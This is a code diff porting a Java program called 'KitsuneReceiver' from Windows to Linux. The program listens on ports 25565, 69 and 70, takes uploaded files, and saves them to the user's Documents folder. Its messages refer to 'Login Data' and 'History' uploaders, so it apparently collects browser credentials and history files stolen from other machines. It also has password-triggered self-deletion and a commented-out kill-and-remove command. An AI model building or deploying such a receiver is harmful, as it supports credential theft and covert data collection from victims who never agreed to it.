@@ -4,11 +4,11 @@ import java.util.Calendar;
 import java.util.Scanner;
 import java.util.concurrent.ThreadLocalRandom;
 
-public class ashiatonikki_win
+public class lanreceiver_linux
 {
-	public static String emotes[] = new String[11];
-	public static void main(String[] args) throws IOException, URISyntaxException
-	{
+  public static String emotes[] = new String[12];
+  public static void main(String[] args) throws IOException, URISyntaxException
+  {
 	  emotes[0] = "(*・ω・)ﾉ";
 	  emotes[1] = "(°ロ°) !";
 	  emotes[2] = "( ´(ｴ)ˋ )";
@@ -20,14 +20,18 @@ public class ashiatonikki_win
 	  emotes[8] = "ヾ(○ω○)ノ";
 	  emotes[9] = " ψ(｀∇´)ψ";
 	  emotes[10]=" (๑•﹏•)⋆* ⁑⋆*";
+	  emotes[11]="w(°ｏ°)w";
 	  System.out.println("-+-[[KitsuneReceiver Rainier Version (Stable v0.5)]]-+-");
-	  System.out.println("-+-[[Windows Edition (for NT systems ONLY)]]-+-");
+	  System.out.println("-+-[[Linux Version (for Kali/Debian/Ubuntu)]]-+-");
+	  if (!(System.getProperty("user.name").matches("root"))) {
+		  System.err.println("[!]" + emotes[11] + " You are not the admin. History and Login Data uploader will be unavailable, as they require restricted ports 69 and 420.");
+	  } 
 	  int tries = 3;
 	  for(;;) {
 		  if(tries == 0) {
 			  try {
 			  System.out.println("Access denied, receiver will now self-destruct");
-			   File cf = new File(ashiatonikki_win.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+			   File cf = new File(lanreceiver_linux.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 				cf.deleteOnExit(); 
 				// System.out.print(cf);
 				 System.exit(0);
@@ -51,7 +55,7 @@ public class ashiatonikki_win
 			  break;
 		  } else {
 			  tries--;
-			  System.out.println(emotes[10] + " Incorrect password, " + tries + " tries remaining");
+			  System.out.println("Incorrect password, " + tries + " tries remaining");
 		  }
 	  }
 	  for(int i = 0; i < 420; i++)
@@ -160,7 +164,7 @@ public class ashiatonikki_win
 				  String sh = s.nextLine();
 				  if (sh.contains("y")) {
 					  System.out.println("Self-destruct activated.");
-					  File cf = new File(ashiatonikki_win.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+					  File cf = new File(lanreceiver_linux.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 						 cf.deleteOnExit();
 						 System.exit(0);
 				  } else {
@@ -174,7 +178,7 @@ public class ashiatonikki_win
 					  String sh = s.nextLine();
 					  if (sh.matches("y")) {
 						  System.out.println("自己破壊の活性化.");
-						  File cf = new File(ashiatonikki_win.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+						  File cf = new File(lanreceiver_linux.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 							// @SuppressWarnings("unused")
 							 //Process bye = Runtime.getRuntime().exec("killall -e java && rm " + cf);
 						  	cf.deleteOnExit();
@@ -190,7 +194,7 @@ public class ashiatonikki_win
 					  String sh = s.nextLine();
 					  if (sh.matches("y")) {
 						  System.out.println("自毁被激活。");
-						  File cf = new File(ashiatonikki_win.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
+						  File cf = new File(lanreceiver_linux.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 							// @SuppressWarnings("unused")
 						  	cf.deleteOnExit();
 							 // Process bye = Runtime.getRuntime().exec("killall -e java && rm " + cf);
@@ -236,26 +240,6 @@ public class ashiatonikki_win
 			  }
 		  } else if (ch.matches("ip")) {
 			  System.out.println("IP: " + InetAddress.getLocalHost().getHostAddress());
-		  } else if (ch.matches("version")) {
-			  System.out.println("Update version v0.5");
-		  } else if (ch.matches("license")) {
-			  System.out.println("Permission is hereby granted, free of charge, to any person obtaining a copy\r\n" + 
-			  		"of this software and associated documentation files (the \"Software\"), to deal\r\n" + 
-			  		"in the Software without restriction, including without limitation the rights\r\n" + 
-			  		"to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\r\n" + 
-			  		"copies of the Software, and to permit persons to whom the Software is\r\n" + 
-			  		"furnished to do so, subject to the following conditions:\r\n" + 
-			  		"\r\n" + 
-			  		"The above copyright notice and this permission notice shall be included in all\r\n" + 
-			  		"copies or substantial portions of the Software.\r\n" + 
-			  		"\r\n" + 
-			  		"THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\r\n" + 
-			  		"IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\r\n" + 
-			  		"FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\r\n" + 
-			  		"AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\r\n" + 
-			  		"LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\r\n" + 
-			  		"OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\r\n" + 
-			  		"SOFTWARE.");
 		  }
 	  }
   }
@@ -264,7 +248,7 @@ public class ashiatonikki_win
 	  @SuppressWarnings("resource")
 	  ServerSocket sersock = new ServerSocket(25565);
 	  for(;;){
-      System.out.println("Ready to receive files DADADA! (≧▽≦)/");
+	  System.out.println("Ready to receive files DADADA! " + emotes[4]);
       Socket sock = sersock.accept( );                          
       InputStream istream = sock.getInputStream();
       BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
@@ -299,11 +283,11 @@ public class ashiatonikki_win
 	}
   public static void record(String x) {
 		try {
-			File log = new File("C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt");
+			File log = new File("/home/" + System.getProperty("user.name") + "/Documents/log.txt");
 			if(!log.exists()) {
 				log.createNewFile();
 			}
-			String filename = "C:/Users/" + System.getProperty("user.name") + "/Desktop/log.txt";
+			String filename = "/home/" + System.getProperty("user.name") + "/Documents/log.txt";
 			PrintWriter out = new PrintWriter(new FileWriter(filename, true));
 			 System.out.println("rec " + x);
 			out.println(x);
@@ -318,7 +302,7 @@ public class ashiatonikki_win
    		  @SuppressWarnings("resource")
    		  ServerSocket getnom = new ServerSocket(69);
    		  for(;;){
-   	      System.out.println("Ready to receive files DADADA! " + emotes[4]);
+   		  System.out.println("Ready to receive files DADADA! " + emotes[4]);
    	      Socket namesock = getnom.accept();               
    	      InputStream istream = namesock.getInputStream();
    	      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
@@ -341,7 +325,7 @@ public class ashiatonikki_win
    	 		     Socket socket = serverSocket.accept();
    	 		     byte [] bytearray = new byte [filesize]; 
    	 		     InputStream is = socket.getInputStream(); 
-   	 		FileOutputStream fos = new FileOutputStream("C:/Users/" + System.getProperty("user.name") + "/Documents/" + nameoffile); 
+   	 		FileOutputStream fos = new FileOutputStream("/home/" + System.getProperty("user.name") + "/Documents/" + nameoffile); 
    	 		BufferedOutputStream bos = new BufferedOutputStream(fos); 
    	 		bytesRead = is.read(bytearray,0,bytearray.length); 
    	 		currentTot = bytesRead; 
@@ -360,9 +344,9 @@ public class ashiatonikki_win
    	 			System.out.println("The login file is in the documents folder.");
    	 			} 
    	          }catch (Exception e) {
-   	    		  System.out.println(emotes[3]);
-   	    		  System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
-   	    		  System.out.println("Exception: " + e);
+   	        	System.out.println(emotes[3]);
+      		  System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
+      		  System.out.println("Exception: " + e);
    	    		  break;
    	    	  }
    	      }
@@ -374,7 +358,7 @@ public class ashiatonikki_win
       		  @SuppressWarnings("resource")
       		  ServerSocket getnom = new ServerSocket(70);
       		  for(;;){
-      	      System.out.println("Ready to receive files DADADA! " + emotes[4]);
+      		  System.out.println("Ready to receive files DADADA! " + emotes[4]);
       	      Socket namesock = getnom.accept();               
       	      InputStream istream = namesock.getInputStream();
       	      BufferedReader receiveRead = new BufferedReader(new InputStreamReader(istream));
@@ -397,7 +381,7 @@ public class ashiatonikki_win
       	 		     Socket socket = serverSocket.accept();
       	 		     byte [] bytearray = new byte [filesize]; 
       	 		     InputStream is = socket.getInputStream(); 
-      	 		FileOutputStream fos = new FileOutputStream("C:/Users/" + System.getProperty("user.name") + "/Documents/" + nameoffile); 
+      	 		FileOutputStream fos = new FileOutputStream("/home/" + System.getProperty("user.name") + "/Documents/" + nameoffile); 
       	 		BufferedOutputStream bos = new BufferedOutputStream(fos); 
       	 		bytesRead = is.read(bytearray,0,bytearray.length); 
       	 		currentTot = bytesRead; 
@@ -416,9 +400,9 @@ public class ashiatonikki_win
       	 			System.out.println("The history file is in the documents folder.");
       	 			} 
       	          }catch (Exception e) {
-      	    		  System.out.println(emotes[3]);
-      	    		  System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
-      	    		  System.out.println("Exception: " + e);
+      	        	System.out.println(emotes[3]);
+      	        	System.out.println("\n ＴＨＩＳ ＭＵＳＴ ＢＥ ＴＨＥ ＷＯＲＫ ＯＦ ＡＮ ＥＮＥＭＹ 「ＳＴＡＮＤ」！\n");
+      	        	System.out.println("Exception: " + e);
       	    		  break;
       	    	  }
       	      }
